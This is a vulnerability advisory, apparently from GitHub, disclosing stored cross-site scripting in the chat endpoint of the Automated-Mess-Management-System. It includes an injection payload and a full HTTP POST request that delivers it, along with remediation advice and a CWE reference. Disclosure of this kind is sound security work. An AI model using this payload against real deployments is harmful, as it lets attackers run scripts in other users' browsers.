# boyiddha / Automated-Mess-Management-System - /member/chat.php Stored XSS

## Vendor Homepage:
[Automated-Mess-Management-System](https://github.com/boyiddha/Automated-Mess-Management-System)

## Impact
The `/member/chat.php` endpoint in the Automated-Mess-Management-System is vulnerable to Stored Cross-Site Scripting (XSS) attacks, which could allow attackers to inject malicious scripts into the application. This vulnerability can have a significant impact, enabling attackers to execute arbitrary JavaScript code in the context of other users' browsers who access the chat feature.


## Proof of Concept
Step 1: Login as a member.\
Step 2: Go to chat book\
Step 3: send the following payload "><img src=x onerror=alert(1)>"\
Step 4: Injected xss will render on reload


## HTTP Request Example
``` http request
POST /member/chat.php HTTP/1.1
Host: [REDACTED]
Content-Length: 260
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYTGco3iyTv9NB0KO
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: [REDACTED]
Connection: close

------WebKitFormBoundaryYTGco3iyTv9NB0KO
Content-Disposition: form-data; name="msg"

><img src=x onerror=alert(1)>
------WebKitFormBoundaryYTGco3iyTv9NB0KO
Content-Disposition: form-data; name="submit"

send
------WebKitFormBoundaryYTGco3iyTv9NB0KO--

```
## Proof with Screenshot
![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/60700937/89e08ae6-7bb0-48ef-92e3-0afc0401a080)


## Remidiation
To mitigate this issue, developers should implement proper input validation and output encoding to prevent the execution of malicious scripts. Additionally, the application should sanitize user inputs to neutralize any potentially harmful content before rendering it in the browser.

## CWE
[CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
